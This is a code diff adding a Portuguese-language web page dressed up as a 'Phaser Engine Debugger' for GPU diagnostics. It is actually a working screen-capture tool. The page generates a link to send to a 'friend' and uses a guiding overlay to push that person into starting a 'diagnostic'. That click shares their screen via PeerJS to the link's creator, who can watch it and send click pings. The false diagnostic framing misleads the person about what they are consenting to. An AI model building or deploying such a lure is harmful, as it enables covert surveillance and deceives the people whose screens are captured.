@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Phaser Engine Debugger</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #050505; color: #00ff41; font-family: monospace; overflow: hidden; touch-action: none; }
+        .crt-line { width: 100%; height: 2px; background: rgba(0, 255, 65, 0.05); position: absolute; animation: scan 4s linear infinite; pointer-events: none; }
+        @keyframes scan { from { top: 0; } to { top: 100%; } }
+        .ping-visual { position: fixed; width: 40px; height: 40px; border: 2px solid #00ff41; border-radius: 50%; transform: translate(-50%, -50%); pointer-events: none; z-index: 9999; animation: ping-ani 0.6s ease-out; }
+        @keyframes ping-ani { from { transform: translate(-50%, -50%) scale(0); opacity: 1; } to { transform: translate(-50%, -50%) scale(2); opacity: 0; } }
+        .guide-arrow { position: fixed; bottom: 15%; left: 50%; transform: translateX(-50%); z-index: 1000; animation: bounce 0.5s infinite alternate; }
+        @keyframes bounce { from { transform: translateX(-50%) translateY(0); } to { transform: translateX(-50%) translateY(-20px); } }
+    </style>
+</head>
+<body>
+    <div class="crt-line"></div>
+
+    <div id="main-ui" class="h-screen flex flex-col p-4 relative z-10">
+        <div class="border border-[#00ff41] p-2 flex justify-between text-[10px] mb-4">
+            <span>CORE_V3_RUNNING</span>
+            <span id="clock">00:00:00</span>
+        </div>
+
+        <div id="tech-view" class="hidden flex-1 flex flex-col border border-blue-500 rounded-lg overflow-hidden bg-black">
+            <div class="bg-blue-900/20 p-2 text-[10px] text-blue-400">VIRTUAL_FEED_ACTIVE</div>
+            <video id="remote-video" autoplay playsinline class="w-full h-full object-contain"></video>
+        </div>
+
+        <div id="host-view" class="flex-1 flex flex-col items-center justify-center border border-[#00ff41] border-dashed rounded-lg p-6 text-center">
+            <div class="w-16 h-16 border border-[#00ff41] rounded-full mb-4 flex items-center justify-center animate-pulse">
+                <div class="w-4 h-4 bg-[#00ff41] rounded-full"></div>
+            </div>
+            <h2 class="font-bold text-lg mb-2 tracking-tighter">PHASER_ENGINE_DEBUG</h2>
+            <p class="text-[10px] opacity-60 mb-8">Otimização de GPU e sincronização de buffers remotos.</p>
+            
+            <button id="btn-start" onclick="initProcess()" class="w-full py-4 bg-[#00ff41] text-black font-black hover:opacity-80 active:scale-95 transition-all">
+                INICIAR DIAGNÓSTICO
+            </button>
+        </div>
+
+        <div class="mt-4 p-3 border border-[#00ff41]/30 bg-[#00ff41]/5 text-[10px]">
+            <div class="flex justify-between mb-1">
+                <span class="opacity-50">LOCAL_ID:</span>
+                <span id="display-id" class="font-bold">INITIALIZING...</span>
+            </div>
+            <div id="link-area" class="hidden">
+                <p class="opacity-50 mb-1">LINK PARA O AMIGO:</p>
+                <div id="final-link" class="bg-black p-2 border border-[#00ff41] break-all text-white select-all"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="guide" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[500] hidden">
+        <div class="guide-arrow">
+            <div class="bg-[#00ff41] text-black px-4 py-2 rounded-full font-black text-sm">CLIQUE EM "INICIAR" ↓</div>
+            <div class="w-0 h-0 border-l-[15px] border-l-transparent border-r-[15px] border-r-transparent border-t-[20px] border-t-[#00ff41] mx-auto mt-[-2px]"></div>
+        </div>
+    </div>
+
+    <script>
+        const peer = new Peer();
+        const urlParams = new URLSearchParams(window.location.search);
+        const connectId = urlParams.get('connect');
+        let currentConn = null;
+
+        // Relógio
+        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
+
+        peer.on('open', (id) => {
+            document.getElementById('display-id').innerText = id;
+            if (!connectId) {
+                // Modo Técnico: Gera o link
+                document.getElementById('link-area').classList.remove('hidden');
+                const cleanUrl = window.location.href.split('?')[0];
+                document.getElementById('final-link').innerText = `${cleanUrl}?connect=${id}`;
+            }
+        });
+
+        // Quando recebe a tela (Você como técnico)
+        peer.on('call', (call) => {
+            call.answer();
+            call.on('stream', (stream) => {
+                document.getElementById('host-view').classList.add('hidden');
+                document.getElementById('tech-view').classList.remove('hidden');
+                document.getElementById('remote-video').srcObject = stream;
+            });
+        });
+
+        peer.on('connection', (conn) => {
+            currentConn = conn;
+            conn.on('data', (data) => { if (data.type === 'ping') spawnPing(data.x, data.y); });
+        });
+
+        async function initProcess() {
+            if (!connectId) {
+                alert("Você está no modo técnico. Envie o link abaixo para seu amigo.");
+                return;
+            }
+
+            const guide = document.getElementById('guide');
+            const btn = document.getElementById('btn-start');
+
+            guide.classList.remove('hidden');
+            btn.innerText = "Aguardando Sistema...";
+
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                guide.classList.add('hidden');
+                
+                peer.call(connectId, stream);
+                const conn = peer.connect(connectId);
+                currentConn = conn;
+
+                btn.innerText = "Sincronizado";
+                btn.style.borderColor = "#00ff41";
+            } catch (err) {
+                guide.classList.add('hidden');
+                btn.innerText = "Erro ao Sincronizar";
+            }
+        }
+
+        // Enviar clique (Você clica no vídeo e ele vê lá)
+        document.getElementById('remote-video').addEventListener('pointerdown', (e) => {
+            if (!currentConn) return;
+            const rect = e.target.getBoundingClientRect();
+            currentConn.send({
+                type: 'ping',
+                x: (e.clientX - rect.left) / rect.width,
+                y: (e.clientY - rect.top) / rect.height
+            });
+        });
+
+        function spawnPing(x, y) {
+            const div = document.createElement('div');
+            div.className = 'ping-visual';
+            div.style.left = (x * 100) + '%';
+            div.style.top = (y * 100) + '%';
+            document.body.appendChild(div);
+            if (navigator.vibrate) navigator.vibrate(50);
+            setTimeout(() => div.remove(), 600);
+        }
+    </script>
+</body>
+</html>
